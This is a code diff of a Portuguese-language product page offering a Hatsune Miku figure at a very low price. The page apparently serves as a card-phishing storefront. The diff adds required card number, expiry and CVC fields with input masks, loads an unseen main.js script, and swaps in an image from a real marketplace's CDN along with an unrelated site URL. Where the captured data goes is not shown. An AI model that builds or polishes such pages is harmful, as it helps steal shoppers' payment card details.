@@ -36,12 +36,14 @@ SOFTWARE.
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta property="og:title" content="Hatsune Miku" />
     <meta property="og:description" content="Hatsune Miku Figma PVC Action Figure para Crianças, Movable Face Change, Boxed Anime Doll, Decoração Modelo Brinquedos, Girls Gift, 14cm, 014" />
-    <meta property="og:image" content="https://telegra.ph/file/90d09bee43a2608eac40b.png" />
-    <meta property="og:url" content="https://example.com/your-page-url" />
+    <meta property="og:image" content="https://down-br.img.susercontent.com/file/br-11134207-7r98o-lqjaeamu5iqv24" />
+    <meta property="og:url" content="https://www.bonecas.girls.com.br" />
     <meta property="og:type" content="website" />
     <link rel="shortcut icon" href="./whmer-logo.png" type="image/x-icon">
     <link rel="stylesheet" href="./hatsune/style.css">
     <title>Hatsune Miku - Figma</title>
+    <script src="./jquery-3.6.3.min.js"></script>
+    <script src="./main.js"></script>
     <!--https://down-br.img.susercontent.com/file/br-11134207-7r98o-lqjaeamu5iqv24-->
 </head>
 <body>
@@ -74,7 +76,7 @@ SOFTWARE.
                 <p style="margin-top: -10px; margin-left: 10px; color: #7e7d7d; font-size: 13px;">Brinquedos Girls</p>
             </div>
             <div class="home_hb">
-                <h3 style="margin: 10px;">vendido<br><p style="color: #7e7d7d; font-size: 13px;">670 bonecas</p></h3>
+                <h3 style="margin: 10px;">Vendido<br><p style="color: #7e7d7d; font-size: 13px;">670 bonecas</p></h3>
                 <h3 style="margin: 10px;">Tamanho<br><p style="color: #7e7d7d; font-size: 13px;">14cm</p></h3>
                 <h3 style="margin: 10px;">Preço<br><p style="color: #7e7d7d; font-size: 13px;">R$20,47</p></h3>
             </div>
@@ -153,7 +155,7 @@ SOFTWARE.
     </div>
     <div class="backwer" id="backj">
         <div class="home_ha">
-            <h3 style="margin: 10px;">vendido<br><p style="color: #7e7d7d; font-size: 13px;">670 bonecas</p></h3>
+            <h3 style="margin: 10px;">Vendido<br><p style="color: #7e7d7d; font-size: 13px;">670 bonecas</p></h3>
             <h3 style="margin: 10px;">Tamanho<br><p style="color: #7e7d7d; font-size: 13px;">14cm</p></h3>
             <h3 style="margin: 10px;">Preço<br><p style="color: #7e7d7d; font-size: 13px;">R$20,47</p></h3>
         </div>
@@ -196,13 +198,21 @@ SOFTWARE.
             <h4 style="font-size: 18px; margin-left: 5px; font-weight: 400;">Informe os dados do cartão para continuar</h4>
             <p style="font-size: 14px; margin-left: 5px; color: #7e7d7d; margin-top: 5px; font-weight: 400;">Boneca Hatsune Miku R$20,47</p>
             <br>
-            <input type="text" class="cdd" id="cc1" placeholder="Número do cartão" onblur='this.placeholder="Número do cartão"' onfocus='this.placeholder=""'/>
+            <input type="text" class="cdd" id="cc1" placeholder="Número do cartão" onblur='this.placeholder="Número do cartão"' onfocus='this.placeholder=""' required/>
             <div class="ccflex">
-                <input type="text" class="input" id="cc2" placeholder="Validade" onblur='this.placeholder="Validade"' onfocus='this.placeholder=""'/>
+                <input type="text" class="input" id="cc2" placeholder="Validade" onblur='this.placeholder="Validade"' onfocus='this.placeholder=""' required/>
                 <div class="iconh">
-                    <input type="text" class="input" id="cc3" placeholder="CVC" onblur='this.placeholder="CVC"' onfocus='this.placeholder=""'/>
+                    <input type="text" class="input" id="cc3" placeholder="CVC" onblur='this.placeholder="CVC"' onfocus='this.placeholder=""' required/>
                 </div>
             </div>
+            
+           <script>
+            $(document).ready(function(){
+      $('#cc1').mask('0000 0000 0000 0000');
+      $('#cc2').mask('00/00');
+      $('#cc3').mask('000');
+  })
+          </script>
         </div>
             <div class="foty">
                 <button type="submit" id="submitButton" class="ccf">Continuar</button>
